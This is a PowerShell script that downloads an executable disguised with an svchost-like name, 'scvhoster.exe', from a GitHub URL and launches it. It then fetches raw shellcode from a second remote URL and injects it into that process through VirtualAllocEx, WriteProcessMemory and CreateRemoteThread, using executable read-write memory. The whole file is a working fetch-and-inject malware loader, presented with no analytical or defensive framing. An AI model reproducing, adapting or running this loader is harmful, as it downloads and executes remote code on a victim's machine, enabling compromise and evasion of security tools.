# --- Download & Launch Test App ---
$testAppUrl = "https://raw.githubusercontent.com/Magturn/Bat/main/scvhoster.exe"
$tempPath   = "$env:TEMP\scvhoster.exe"
Invoke-WebRequest -Uri $testAppUrl -OutFile $tempPath -ErrorAction Stop
$targetProcess = Start-Process -FilePath $tempPath -PassThru -ErrorAction Stop
Start-Sleep -Seconds 3
if (-not $targetProcess) { exit }

$targetPID = $targetProcess.Id

# --- Download Shellcode ---
$agentUrl = "https://raw.githubusercontent.com/Magturn/Test/main/binner.bin"
$wc = New-Object System.Net.WebClient
$shellcode = $wc.DownloadData($agentUrl)
if ($shellcode.Length -eq 0) { exit }

# --- Define Win32 API Functions ---
$signature = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
Add-Type $signature

# --- Open Process & Allocate Memory ---
$PROCESS_ALL_ACCESS     = 0x1F0FFF
$MEM_COMMIT             = 0x1000
$MEM_RESERVE            = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
if ($hProcess -eq [IntPtr]::Zero) { exit }

$size = $shellcode.Length
$allocAddress = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_EXECUTE_READWRITE)
if ($allocAddress -eq [IntPtr]::Zero) {
    [Win32]::CloseHandle($hProcess)
    exit
}

# --- Write Shellcode ---
[int]$bytesWritten = 0
$result = [Win32]::WriteProcessMemory($hProcess, $allocAddress, $shellcode, $shellcode.Length, [ref]$bytesWritten)
if (-not $result -or $bytesWritten -ne $shellcode.Length) {
    [Win32]::CloseHandle($hProcess)
    exit
}

# --- Create Remote Thread ---
$threadHandle = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($threadHandle -eq [IntPtr]::Zero) {
    [Win32]::CloseHandle($hProcess)
    exit
}

# --- Clean Up ---
[Win32]::CloseHandle($hProcess)
